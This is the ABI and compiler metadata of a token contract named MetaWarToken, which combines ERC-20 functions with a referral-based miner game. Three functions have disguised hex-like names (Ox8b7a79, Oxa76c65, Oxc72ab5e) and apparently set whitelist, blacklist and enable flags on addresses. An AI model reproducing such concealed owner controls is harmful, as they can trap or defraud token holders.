"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"Buy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BuyBox\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"Hire\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidity_\",\"type\":\"address\"}],\"name\":\"Liquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"white_\",\"type\":\"uint8\"}],\"name\":\"Ox8b7a79\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"black_\",\"type\":\"uint8\"}],\"name\":\"Oxa76c65\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"enable_\",\"type\":\"uint8\"}],\"name\":\"Oxc72ab5e\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Receive\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Reinvest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"addLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"}],\"name\":\"authNum\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMiner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"swHiere\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"swReceive\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"claim\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"miner\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"speed\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"referral\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"earned\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"status\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"box\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"settle\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getMinerInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"claim\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"miner\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"speed\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"referral\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"earned\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"status\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"box\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"settle\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"buy\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRound\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"saleMin\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"swSale\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"roundIndex\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"salePrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceEth\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceToken\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getRoundBalances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getRoundTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"ah\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"ah2\",\"type\":\"address\"}],\"name\":\"setAuth\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tag\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"update\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MetaWarToken", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://39fdbb9a376b9308c111e8eb346d0e0d959bdbf80f966227c2884c664818f86e"}